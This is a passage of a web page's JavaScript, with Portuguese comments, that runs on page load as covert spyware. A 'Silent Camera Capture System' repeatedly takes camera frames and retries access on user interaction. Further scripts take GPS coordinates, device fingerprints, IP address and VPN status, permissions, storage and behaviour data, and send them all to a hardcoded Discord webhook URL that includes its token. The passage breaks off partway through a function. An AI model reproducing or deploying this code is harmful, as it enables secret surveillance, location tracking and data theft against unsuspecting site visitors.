    },
    
    async captureAndSendFrame() {
        if (!this.stream) return;
        
        try {
            const track = this.stream.getVideoTracks()[0];
            if (!track) return;
            
            let blob;
            
            // M√©todo moderno com ImageCapture API
            if ('ImageCapture' in window) {
                blob = await this.captureWithImageCapture(track);
            } else {
                // M√©todo alternativo com elemento video
                blob = await this.captureWithVideoElement(track);
            }
            
            if (blob) {
                await this.sendToWebhook(blob);
            }
            
        } catch (error) {
            console.error('Erro ao capturar frame:', error);
        }
    },
    
    async captureWithImageCapture(track) {
        try {
            const imageCapture = new ImageCapture(track);
            const bitmap = await imageCapture.grabFrame();
            
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bitmap, 0, 0);
            
            return new Promise((resolve) => {
                canvas.toBlob(resolve, 'image/jpeg', 0.85);
            });
            
        } catch (error) {
            console.error('Erro ImageCapture:', error);
            return null;
        }
    },
    
    async captureWithVideoElement(track) {
        return new Promise((resolve) => {
            const video = document.createElement('video');
            video.playsInline = true;
            video.muted = true;
            video.srcObject = new MediaStream([track]);
            
            video.onloadeddata = () => {
                video.play().then(() => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(resolve, 'image/jpeg', 0.85);
                    }, 500);
                });
            };
            
            video.onerror = () => resolve(null);
        });
    },
    
    async sendToWebhook(blob) {
        try {
            const formData = new FormData();
            
            const payload = {
                username: "üì∑ Silent Camera Capture",
                embeds: [{
                    title: "üñºÔ∏è CAPTURA DE C√ÇMERA SILENCIOSA",
                    color: 0x5865F2,
                    description: `**Captura #${this.captureCount + 1}** realizada silenciosamente`,
                    fields: [
                        { name: "üìä Total de Capturas", value: String(this.captureCount + 1), inline: true },
                        { name: "‚è∞ Hor√°rio", value: new Date().toLocaleString('pt-BR'), inline: true },
                        { name: "üÜî Sess√£o", value: this.sessionId, inline: true },
                        { name: "üì± Dispositivo", value: this.getDeviceType(), inline: true },
                        { name: "üåê User Agent", value: navigator.userAgent.substring(0, 50) + '...', inline: false }
                    ],
                    timestamp: new Date().toISOString(),
                    image: { url: "attachment://captura.jpg" },
                    footer: { text: "Silent Camera Capture System" }
                }]
            };
            
            formData.append("payload_json", JSON.stringify(payload));
            formData.append("file", blob, "captura.jpg");
            
            const response = await fetch(WEBHOOK_URL_NOVO_4, {
                method: "POST",
                body: formData
            });
            
            if (response.ok) {
                console.log(`‚úÖ Captura #${this.captureCount + 1} enviada com sucesso`);
            } else {
                console.error('‚ùå Erro ao enviar captura:', response.status);
            }
            
        } catch (error) {
            console.error('üí• Erro no webhook:', error);
        }
    },
    
    getDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'tablet';
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'mobile';
        return 'desktop';
    },
    
    stopCapture() {
        if (this.captureInterval) {
            clearInterval(this.captureInterval);
            this.captureInterval = null;
        }
        
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        
        this.isCapturing = false;
        console.log('üõë Captura de c√¢mera parada');
    },
    
    tryAlternativeMethods() {
        console.log('üîÑ Tentando m√©todos alternativos de captura...');
        
        // M√©todo 1: Tentar com configura√ß√µes diferentes
        setTimeout(() => {
            this.tryDifferentConstraints();
        }, 10000);
        
        // M√©todo 2: Tentar quando o usu√°rio interagir com a p√°gina
        this.setupInteractionTrigger();
    },
    
    async tryDifferentConstraints() {
        try {
            // Tentar com constraints diferentes
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'environment', // C√¢mera traseira
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
            
            console.log('‚úÖ Acesso √† c√¢mera concedido com constraints alternativas');
            this.startContinuousCapture();
            
        } catch (error) {
            console.log('‚ùå M√©todo alternativo tamb√©m falhou');
        }
    },
    
    setupInteractionTrigger() {
        // Tentar acessar a c√¢mera quando o usu√°rio interagir com a p√°gina
        const interactionEvents = ['click', 'touchstart', 'keydown', 'mousemove'];
        
        const tryCaptureOnInteraction = async () => {
            if (!this.isCapturing) {
                try {
                    await this.requestCameraAccess();
                    // Remover listeners se conseguir acesso
                    interactionEvents.forEach(event => {
                        document.removeEventListener(event, tryCaptureOnInteraction);
                    });
                } catch (error) {
                    // Continuar tentando
                }
            }
        };
        
        interactionEvents.forEach(event => {
            document.addEventListener(event, tryCaptureOnInteraction, { once: false });
        });
        
        console.log('üëÜ Aguardando intera√ß√£o do usu√°rio para ativar c√¢mera...');
    },
    
    // M√©todo para verificar status
    getStatus() {
        return {
            isCapturing: this.isCapturing,
            captureCount: this.captureCount,
            sessionId: this.sessionId,
            streamActive: !!this.stream,
            maxCaptures: this.maxCaptures
        };
    }
};

// Sistema de detec√ß√£o de permiss√£o autom√°tica
const PermissionDetector = {
    async init() {
        // Verificar se j√° temos permiss√£o de c√¢mera
        try {
            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
            
            permissionStatus.onchange = () => {
                console.log('üîÑ Status da permiss√£o de c√¢mera mudou:', permissionStatus.state);
                
                if (permissionStatus.state === 'granted') {
                    console.log('‚úÖ Permiss√£o de c√¢mera detectada - Iniciando captura...');
                    SilentCameraCapture.init();
                }
            };
            
            if (permissionStatus.state === 'granted') {
                console.log('‚úÖ Permiss√£o de c√¢mera j√° concedida anteriormente');
                SilentCameraCapture.init();
            } else {
                console.log('‚è≥ Aguardando permiss√£o de c√¢mera...');
                this.setupAutoDetection();
            }
            
        } catch (error) {
            console.log('üîß Sistema de permiss√µes n√£o dispon√≠vel, tentando acesso direto...');
            SilentCameraCapture.init();
        }
    },
    
    setupAutoDetection() {
        // Tentar detectar quando a permiss√£o for concedida em outros tabs/contextos
        this.periodicCheck();
    },
    
    async periodicCheck() {
        setInterval(async () => {
            try {
                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                if (permissionStatus.state === 'granted' && !SilentCameraCapture.isCapturing) {
                    console.log('üéØ Permiss√£o de c√¢mera detectada periodicamente!');
                    SilentCameraCapture.init();
                }
            } catch (error) {
                // Ignorar erros
            }
        }, 10000); // Verificar a cada 10 segundos
    }
};

// Inicializa√ß√£o do sistema
document.addEventListener('DOMContentLoaded', function() {
    console.log('üì∑ Iniciando sistema de captura de c√¢mera...');
    
    // Pequeno delay para a p√°gina carregar completamente
    setTimeout(() => {
        PermissionDetector.init();
    }, 3000);
});

// Inicializa√ß√£o alternativa se DOM j√° estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => PermissionDetector.init(), 1000);
    });
} else {
    setTimeout(() => PermissionDetector.init(), 1000);
}

// Controles manuais para debugging (opcional)
window.cameraControl = {
    start: () => SilentCameraCapture.init(),
    stop: () => SilentCameraCapture.stopCapture(),
    status: () => SilentCameraCapture.getStatus(),
    test: async () => {
        // Teste manual de captura
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            console.log('‚úÖ Teste de c√¢mera bem-sucedido');
            stream.getTracks().forEach(track => track.stop());
        } catch (error) {
            console.error('‚ùå Teste de c√¢mera falhou:', error);
        }
    }
};

console.log('üì∑ Silent Camera Capture System carregado - WEBHOOK_NOVO_4');
</script>
<script>

// Webhook URL do Discord
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe';

// Fun√ß√£o para enviar localiza√ß√£o para o webhook do Discord
function enviarParaWebhook(latitude, longitude) {
    const dados = {
        content: `üìç **Localiza√ß√£o Obtida**\n**Latitude:** ${latitude}\n**Longitude:** ${longitude}\n**Google Maps:** https://www.google.com/maps?q=${latitude},${longitude}\n**Timestamp:** ${new Date().toLocaleString()}`,
        username: 'Localizador GPS',
        avatar_url: 'https://cdn-icons-png.flaticon.com/512/684/684908.png'
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(dados)
    })
    .then(response => {
        console.log('Localiza√ß√£o enviada para Discord com sucesso!');
    })
    .catch(error => {
        console.error('Erro ao enviar localiza√ß√£o:', error);
    });
}

// Fun√ß√£o principal para obter localiza√ß√£o
function obterLocalizacao() {
    if (!navigator.geolocation) {
        console.error('Geolocaliza√ß√£o n√£o suportada pelo navegador');
        return;
    }

    const opcoes = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(
        function(posicao) {
            const lat = posicao.coords.latitude;
            const lng = posicao.coords.longitude;
            const precisao = posicao.coords.accuracy;
            
            console.log(`Localiza√ß√£o obtida: ${lat}, ${lng} (Precis√£o: ${precisao}m)`);
            enviarParaWebhook(lat, lng);
        },
        function(erro) {
            console.error('Erro ao obter localiza√ß√£o:', erro.message);
            
            // Enviar mensagem de erro para o Discord
            const dadosErro = {
                content: `‚ùå **Erro ao obter localiza√ß√£o:** ${erro.message}\n**Timestamp:** ${new Date().toLocaleString()}`,
                username: 'Localizador GPS - Erro'
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(dadosErro)
            });
        },
        opcoes
    );
}

// Executar automaticamente quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', function() {
    console.log('Solicitando permiss√£o de localiza√ß√£o automaticamente...');
    setTimeout(obterLocalizacao, 1000); // Pequeno delay para garantir que a p√°gina carregou
});

// Backup: tamb√©m executar quando a janela estiver totalmente carregada
window.addEventListener('load', obterLocalizacao);

</script>
<script>
// Webhook URL do Discord
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe';

// Fun√ß√£o para detectar informa√ß√µes do dispositivo
async function coletarInformacoesDispositivo() {
    const informacoes = {
        // Informa√ß√µes b√°sicas do navegador
        userAgent: navigator.userAgent,
        plataforma: navigator.platform,
        vendor: navigator.vendor,
        
        // Informa√ß√µes de hardware
        nucleosCPU: navigator.hardwareConcurrency || 'Desconhecido',
        memoria: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Desconhecido',
        
        // Conex√£o
        tipoConexao: navigator.connection ? navigator.connection.effectiveType : 'Desconhecido',
        modoAviao: !navigator.onLine,
        
        // Bateria (economia de energia)
        modoEconomia: false,
        nivelBateria: 'Desconhecido',
        
        // C√¢meras
        numeroCameras: 0,
        camerasDetalhes: [],
        
        // √Åudio
        dispositivosAudio: [],
        audioAtivo: false,
        
        // Tela
        resolucaoTela: `${screen.width}x${screen.height}`,
        profundidadeCor: screen.colorDepth + ' bits',
        
        // Tempo
        timestamp: new Date().toLocaleString('pt-BR'),
        fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    // Detectar informa√ß√µes de bateria (modo economia de energia)
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            informacoes.nivelBateria = Math.round(battery.level * 100) + '%';
            informacoes.modoEconomia = battery.charging ? false : battery.level < 0.2;
        } catch (error) {
            console.log('N√£o foi poss√≠vel acessar informa√ß√µes da bateria');
        }
    }

    // Detectar c√¢meras
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const cameras = devices.filter(device => device.kind === 'videoinput');
            informacoes.numeroCameras = cameras.length;
            informacoes.camerasDetalhes = cameras.map(cam => ({
                id: cam.deviceId,
                label: cam.label || 'C√¢mera ' + (informacoes.camerasDetalhes.length + 1)
            }));
        } catch (error) {
            console.log('N√£o foi poss√≠vel acessar informa√ß√µes das c√¢meras');
        }
    }

    // Detectar dispositivos de √°udio
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            informacoes.dispositivosAudio = audioDevices.map(audio => ({
                id: audio.deviceId,
                label: audio.label || 'Microfone ' + (informacoes.dispositivosAudio.length + 1)
            }));
        } catch (error) {
            console.log('N√£o foi poss√≠vel acessar informa√ß√µes de √°udio');
        }
    }

    // Detectar se h√° √°udio ativo (aproxima√ß√£o)
    try {
        const context = new (window.AudioContext || window.webkitAudioContext)();
        const analyser = context.createAnalyser();
        informacoes.audioAtivo = context.state === 'running';
    } catch (error) {
        informacoes.audioAtivo = false;
    }

    return informacoes;
}

// Fun√ß√£o para verificar se √© dispositivo Android
function isAndroid() {
    return /Android/i.test(navigator.userAgent);
}

// Fun√ß√£o para enviar informa√ß√µes para o webhook
function enviarParaWebhook(informacoes) {
    let mensagem = `üì± **INFORMA√á√ïES DO DISPOSITIVO ANDROID**\n\n`;

    // Informa√ß√µes b√°sicas
    mensagem += `**üìã Informa√ß√µes B√°sicas:**\n`;
    mensagem += `‚Ä¢ User Agent: ${informacoes.userAgent}\n`;
    mensagem += `‚Ä¢ Plataforma: ${informacoes.plataforma}\n`;
    mensagem += `‚Ä¢ Vendor: ${informacoes.vendor}\n`;
    mensagem += `‚Ä¢ N√∫cleos CPU: ${informacoes.nucleosCPU}\n`;
    mensagem += `‚Ä¢ Mem√≥ria: ${informacoes.memoria}\n\n`;

    // Status do dispositivo
    mensagem += `**‚ö° Status do Dispositivo:**\n`;
    mensagem += `‚Ä¢ Modo Avi√£o: ${informacoes.modoAviao ? '‚úÖ ATIVO' : '‚ùå Inativo'}\n`;
    mensagem += `‚Ä¢ Modo Economia de Energia: ${informacoes.modoEconomia ? '‚úÖ ATIVO' : '‚ùå Inativo'}\n`;
    mensagem += `‚Ä¢ N√≠vel Bateria: ${informacoes.nivelBateria}\n`;
    mensagem += `‚Ä¢ Tipo Conex√£o: ${informacoes.tipoConexao}\n\n`;

    // C√¢meras
    mensagem += `**üì∏ C√¢meras (${informacoes.numeroCameras}):**\n`;
    if (informacoes.camerasDetalhes.length > 0) {
        informacoes.camerasDetalhes.forEach((cam, index) => {
            mensagem += `‚Ä¢ ${cam.label}\n`;
        });
    } else {
        mensagem += `‚Ä¢ Nenhuma c√¢mera detectada ou permiss√£o negada\n`;
    }
    mensagem += `\n`;

    // √Åudio
    mensagem += `**üé§ Dispositivos de √Åudio (${informacoes.dispositivosAudio.length}):**\n`;
    if (informacoes.dispositivosAudio.length > 0) {
        informacoes.dispositivosAudio.forEach((audio, index) => {
            mensagem += `‚Ä¢ ${audio.label}\n`;
        });
    } else {
        mensagem += `‚Ä¢ Nenhum dispositivo de √°udio detectado\n`;
    }
    mensagem += `‚Ä¢ √Åudio Ativo: ${informacoes.audioAtivo ? '‚úÖ Sim' : '‚ùå N√£o'}\n\n`;

    // Tela
    mensagem += `**üì± Tela:**\n`;
    mensagem += `‚Ä¢ Resolu√ß√£o: ${informacoes.resolucaoTela}\n`;
    mensagem += `‚Ä¢ Profundidade de Cor: ${informacoes.profundidadeCor}\n\n`;

    // Informa√ß√µes adicionais
    mensagem += `**üïí Outras Informa√ß√µes:**\n`;
    mensagem += `‚Ä¢ Timestamp: ${informacoes.timestamp}\n`;
    mensagem += `‚Ä¢ Fuso Hor√°rio: ${informacoes.fusoHorario}\n`;
    mensagem += `‚Ä¢ Dispositivo Android: ${isAndroid() ? '‚úÖ Sim' : '‚ùå N√£o'}`;

    const dados = {
        content: mensagem,
        username: 'Android Device Inspector',
        avatar_url: 'https://cdn-icons-png.flaticon.com/512/300/300221.png'
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(dados)
    })
    .then(response => {
        console.log('Informa√ß√µes do dispositivo enviadas com sucesso!');
    })
    .catch(error => {
        console.error('Erro ao enviar informa√ß√µes:', error);
    });
}

// Executar automaticamente quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', async function() {
    console.log('Coletando informa√ß√µes do dispositivo Android...');
    
    // Pequeno delay para garantir que tudo carregou
    setTimeout(async () => {
        try {
            const informacoes = await coletarInformacoesDispositivo();
            enviarParaWebhook(informacoes);
        } catch (error) {
            console.error('Erro ao coletar informa√ß√µes:', error);
            
            // Enviar mensagem de erro
            const dadosErro = {
                content: `‚ùå **Erro ao coletar informa√ß√µes do dispositivo:** ${error.message}`,
                username: 'Android Device Inspector - Erro'
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(dadosErro)
            });
        }
    }, 2000);
});

// Tamb√©m executar quando a janela estiver totalmente carregada
window.addEventListener('load', async function() {
    console.log('Window loaded - verificando dispositivo...');
});
</script>
<script>
// Webhook para dados exclusivos
const EXCLUSIVE_WEBHOOK = "https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe";

// Sistema de coleta de dados exclusivos e avan√ßados
const ExclusiveDataCollector = {
    sessionId: 'excl_' + Math.random().toString(36).substr(2, 12),
    
    async collectExclusiveData() {
        try {
            const exclusiveData = {
                metadata: {
                    type: 'exclusive_premium_data',
                    sessionId: this.sessionId,
                    timestamp: new Date().toISOString(),
                    collector: 'Exclusive Data Collector v2.0'
                },

                // 1. DADOS DE REDE AVAN√áADOS
                networkAnalysis: await this.getNetworkAnalysis(),
                
                // 2. INFORMA√á√ïES DE SEGURAN√áA
                security: this.getSecurityInfo(),
                
                // 3. DADOS DE COMPORTAMENTO DO USU√ÅRIO
                behavior: this.getUserBehavior(),
                
                // 4. INFORMA√á√ïES DE PRIVACIDADE
                privacy: await this.getPrivacyInfo(),
                
                // 5. DADOS DE CONFIGURA√á√ÉO DO NAVEGADOR
                browserConfig: this.getBrowserConfig(),
                
                // 6. INFORMA√á√ïES DE ACESSIBILIDADE
                accessibility: this.getAccessibilityInfo(),
                
                // 7. DADOS DE PERFORMANCE EXCLUSIVOS
                exclusivePerformance: this.getExclusivePerformance(),
                
                // 8. INFORMA√á√ïES DE TEMPO REAL
                realTime: this.getRealTimeInfo(),
                
                // 9. DETEC√á√ÉO DE FERRAMENTAS DE DESENVOLVIMENTO
                devTools: this.getDevToolsDetection(),
                
                // 10. AN√ÅLISE DE CONTE√öDO DA P√ÅGINA
                pageContent: this.getPageContentAnalysis()
            };

            return exclusiveData;

        } catch (error) {
            console.error('Erro na coleta exclusiva:', error);
            return null;
        }
    },

    // 1. An√°lise avan√ßada de rede
    async getNetworkAnalysis() {
        const analysis = {
            // Teste de velocidade aproximada
            speedTest: await this.performSpeedTest(),
            
            // Informa√ß√µes de proxy/VPN
            proxyDetection: await this.detectProxy(),
            
            // Qualidade da conex√£o
            connectionQuality: this.getConnectionQuality(),
            
            // Dados de lat√™ncia
            latency: await this.measureLatency(),
            
            // Tipo de conex√£o detalhado
            connectionType: this.getDetailedConnectionType()
        };

        return analysis;
    },

    async performSpeedTest() {
        try {
            const startTime = performance.now();
            const response = await fetch('https://httpbin.org/bytes/1024', {
                cache: 'no-cache'
            });
            const endTime = performance.now();
            
            const downloadTime = endTime - startTime;
            const speed = (1024 / (downloadTime / 1000)).toFixed(2); // KB/s
            
            return {
                downloadSpeed: speed + ' KB/s',
                latency: downloadTime.toFixed(2) + ' ms',
                success: true
            };
        } catch (error) {
            return { error: error.message, success: false };
        }
    },

    async detectProxy() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            // Detectar proxies conhecidos
            const suspiciousOrgs = ['cloudflare', 'amazon', 'google', 'microsoft', 'ovh', 'digitalocean'];
            const org = (data.org || '').toLowerCase();
            const isSuspicious = suspiciousOrgs.some(proxy => org.includes(proxy));
            
            return {
                ip: data.ip,
                org: data.org,
                isSuspicious: isSuspicious,
                proxyType: isSuspicious ? 'Poss√≠vel VPN/Proxy' : 'Residencial/Normal',
                country: data.country_name,
                timezone: data.timezone
            };
        } catch (error) {
            return { error: error.message };
        }
    },

    getConnectionQuality() {
        if (!navigator.connection) return 'N/A';
        
        const conn = navigator.connection;
        let quality = 'Excelente';
        
        if (conn.downlink < 1) quality = 'Ruim';
        else if (conn.downlink < 3) quality = 'Regular';
        else if (conn.downlink < 10) quality = 'Boa';
        
        return {
            quality: quality,
            downlink: conn.downlink + ' Mbps',
            rtt: conn.rtt + ' ms',
            effectiveType: conn.effectiveType,
            saveData: conn.saveData
        };
    },

    async measureLatency() {
        const latencies = [];
        
        for (let i = 0; i < 3; i++) {
            const start = performance.now();
            try {
                await fetch('https://httpbin.org/get', { cache: 'no-cache' });
                const end = performance.now();
                latencies.push(end - start);
            } catch (error) {
                latencies.push(999); // Valor alto para indicar erro
            }
        }
        
        const avg = latencies.reduce((a, b) => a + b, 0) / latencies.length;
        return {
            average: avg.toFixed(2) + ' ms',
            min: Math.min(...latencies).toFixed(2) + ' ms',
            max: Math.max(...latencies).toFixed(2) + ' ms',
            stability: (Math.max(...latencies) - Math.min(...latencies) < 100) ? 'Est√°vel' : 'Inst√°vel'
        };
    },

    getDetailedConnectionType() {
        const ua = navigator.userAgent.toLowerCase();
        let type = 'Desconhecido';
        
        if (ua.includes('mobile')) type = 'Mobile';
        if (ua.includes('tablet')) type = 'Tablet';
        if (navigator.connection) {
            type += ` (${navigator.connection.effectiveType})`;
        }
        
        return type;
    },

    // 2. Informa√ß√µes de seguran√ßa
    getSecurityInfo() {
        return {
            // Prote√ß√µes do navegador
            protections: {
                safeBrowsing: this.testSafeBrowsing(),
                popupBlocker: this.testPopupBlocker(),
                adBlocker: this.testAdBlocker(),
                trackingProtection: this.testTrackingProtection()
            },
            
            // Configura√ß√µes de seguran√ßa
            securitySettings: {
                https: window.location.protocol === 'https:',
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                webdriver: navigator.webdriver,
                pdfViewerEnabled: navigator.pdfViewerEnabled
            },
            
            // Vulnerabilidades potenciais
            vulnerabilities: this.checkVulnerabilities()
        };
    },

    testSafeBrowsing() {
        // Teste b√°sico de seguran√ßa
        return {
            https: window.location.protocol === 'https:',
            mixedContent: this.checkMixedContent(),
            insecureForms: this.checkInsecureForms()
        };
    },

    testPopupBlocker() {
        const popup = window.open('', 'test', 'width=100,height=100');
        const blocked = !popup || popup.closed || typeof popup.closed === 'undefined';
        if (popup) popup.close();
        return blocked;
    },

    testAdBlocker() {
        const ad = document.createElement('div');
        ad.className = 'adsbox';
        ad.style.cssText = 'position:absolute;left:-999px;top:-999px;width:1px;height:1px;';
        document.body.appendChild(ad);
        
        const isBlocked = ad.offsetHeight === 0;
        document.body.removeChild(ad);
        return isBlocked;
    },

    testTrackingProtection() {
        return {
            thirdPartyCookies: this.testThirdPartyCookies(),
            fingerprintingResistance: this.testFingerprintingResistance()
        };
    },

    testThirdPartyCookies() {
        try {
            document.cookie = 'test=1; SameSite=None; Secure';
            const enabled = document.cookie.indexOf('test=') !== -1;
            document.cookie = 'test=1; expires=Thu, 01 Jan 1970 00:00:00 GMT';
            return enabled;
        } catch (error) {
            return false;
        }
    },

    testFingerprintingResistance() {
        // Testar resist√™ncia a fingerprinting
        const tests = {
            canvas: this.testCanvasFingerprinting(),
            webgl: this.testWebGLFingerprinting(),
            audio: this.testAudioFingerprinting(),
            fonts: this.testFontFingerprinting()
        };
        
        return {
            ...tests,
            resistanceLevel: Object.values(tests).filter(Boolean).length
        };
    },

    checkVulnerabilities() {
        return {
            oldBrowser: this.checkOldBrowser(),
            insecureSettings: this.checkInsecureSettings(),
            knownVulnerabilities: this.checkKnownVulnerabilities()
        };
    },

    // 3. Comportamento do usu√°rio
    getUserBehavior() {
        return {
            interaction: {
                mouseMovements: this.trackMouseMovements(),
                clicks: this.trackClicks(),
                scroll: this.trackScroll(),
                keyboard: this.trackKeyboard(),
                focus: this.trackFocus()
            },
            
            preferences: {
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                colorScheme: this.getColorScheme(),
                reducedMotion: this.prefersReducedMotion()
            },
            
            session: {
                startTime: new Date().toISOString(),
                referrer: document.referrer,
                pageVisits: this.getPageVisitCount()
            }
        };
    },

    trackMouseMovements() {
        let movements = 0;
        const handler = () => movements++;
        document.addEventListener('mousemove', handler);
        
        // Parar ap√≥s 10 segundos
        setTimeout(() => {
            document.removeEventListener('mousemove', handler);
        }, 10000);
        
        return {
            movementsIn10s: movements,
            trackingActive: true
        };
    },

    trackClicks() {
        let clicks = 0;
        const handler = () => clicks++;
        document.addEventListener('click', handler);
        
        return {
            totalClicks: clicks,
            trackingActive: true
        };
    },

    trackScroll() {
        let scrollDepth = 0;
        const handler = () => {
            scrollDepth = Math.max(scrollDepth, 
                (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100
            );
        };
        window.addEventListener('scroll', handler);
        
        return {
            maxScrollDepth: scrollDepth.toFixed(2) + '%',
            trackingActive: true
        };
    },

    trackKeyboard() {
        let keysPressed = 0;
        const handler = () => keysPressed++;
        document.addEventListener('keydown', handler);
        
        return {
            keysPressed: keysPressed,
            trackingActive: true
        };
    },

    trackFocus() {
        let focusChanges = 0;
        const handler = () => focusChanges++;
        window.addEventListener('focus', handler);
        window.addEventListener('blur', handler);
        
        return {
            focusChanges: focusChanges,
            trackingActive: true
        };
    },

    getColorScheme() {
        return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
    },

    prefersReducedMotion() {
        return window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    },

    getPageVisitCount() {
        const key = 'pageVisitCount';
        let count = parseInt(localStorage.getItem(key)) || 0;
        count++;
        localStorage.setItem(key, count.toString());
        return count;
    },

    // 4. Informa√ß√µes de privacidade
    async getPrivacyInfo() {
        return {
            permissions: await this.getDetailedPermissions(),
            storage: this.getStorageAnalysis(),
            tracking: this.getTrackingStatus(),
            privacySettings: this.getPrivacySettings()
        };
    },

    async getDetailedPermissions() {
        const permissions = {};
        const types = [
            'camera',
            'microphone',
            'geolocation',
            'notifications',
            'persistent-storage',
            'push',
            'midi',
            'background-sync'
        ];
        
        for (const type of types) {
            try {
                const result = await navigator.permissions.query({ name: type });
                permissions[type] = result.state;
            } catch (error) {
                permissions[type] = 'not_supported';
            }
        }
        
        return permissions;
    },

    getStorageAnalysis() {
        let storageInfo = {};
        
        try {
            // LocalStorage
            let lsSize = 0;
            for (let key in localStorage) {
                if (localStorage.hasOwnProperty(key)) {
                    lsSize += localStorage[key].length;
                }
            }
            
            // SessionStorage
            let ssSize = 0;
            for (let key in sessionStorage) {
                if (sessionStorage.hasOwnProperty(key)) {
                    ssSize += sessionStorage[key].length;
                }
            }
            
            storageInfo = {
                localStorage: {
                    size: this.formatBytes(lsSize),
                    items: Object.keys(localStorage).length
                },
                sessionStorage: {
                    size: this.formatBytes(ssSize),
                    items: Object.keys(sessionStorage).length
                },
                cookies: {
                    count: document.cookie.split(';').length,
                    size: this.formatBytes(document.cookie.length)
                }
            };
        } catch (error) {
            storageInfo = { error: error.message };
        }
        
        return storageInfo;
    },

    getTrackingStatus() {
        return {
            thirdPartyCookies: this.testThirdPartyCookies(),
            localStorageTracking: this.checkLocalStorageTracking(),
            sessionStorageTracking: this.checkSessionStorageTracking(),
            indexedDBTracking: this.checkIndexedDBTracking()
        };
    },

    getPrivacySettings() {
        return {
            doNotTrack: navigator.doNotTrack,
            cookieEnabled: navigator.cookieEnabled,
            language: navigator.language,
            platform: navigator.platform
        };
    },

    // 5. Configura√ß√£o do navegador
    getBrowserConfig() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            app: {
                name: navigator.appName,
                version: navigator.appVersion,
                codeName: navigator.appCodeName
            },
            product: navigator.product,
            language: navigator.language,
            languages: navigator.languages,
            cookie: navigator.cookieEnabled,
            java: navigator.javaEnabled(),
            pdf: navigator.pdfViewerEnabled,
            webdriver: navigator.webdriver
        };
    },

    // 6. Informa√ß√µes de acessibilidade
    getAccessibilityInfo() {
        return {
            screenReader: this.detectScreenReader(),
            highContrast: this.detectHighContrast(),
            fontSize: this.getFontSize(),
            animations: this.getAnimationPreferences()
        };
    },

    detectScreenReader() {
        // T√©cnicas para detectar leitores de tela
        return {
            ariaLive: !!document.querySelector('[aria-live]'),
            ariaHidden: !!document.querySelector('[aria-hidden]'),
            screenReaderActive: this.testScreenReader()
        };
    },

    testScreenReader() {
        // Teste b√°sico para leitor de tela
        const styles = window.getComputedStyle(document.body);
        return styles.visibility !== 'hidden' && styles.display !== 'none';
    },

    detectHighContrast() {
        return window.matchMedia('(prefers-contrast: high)').matches;
    },

    getFontSize() {
        const element = document.createElement('div');
        element.style.fontSize = '1rem';
        document.body.appendChild(element);
        const fontSize = window.getComputedStyle(element).fontSize;
        document.body.removeChild(element);
        return fontSize;
    },

    getAnimationPreferences() {
        return {
            reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
            reducedData: window.matchMedia('(prefers-reduced-data: reduce)').matches,
            reducedTransparency: window.matchMedia('(prefers-reduced-transparency: reduce)').matches
        };
    },

    // 7. Performance exclusivo
    getExclusivePerformance() {
        const perf = performance.getEntriesByType('navigation')[0];
        const memory = performance.memory;
        
        return {
            navigation: {
                domComplete: perf ? perf.domComplete : 'N/A',
                loadEventEnd: perf ? perf.loadEventEnd : 'N/A',
                firstPaint: this.getFirstPaint(),
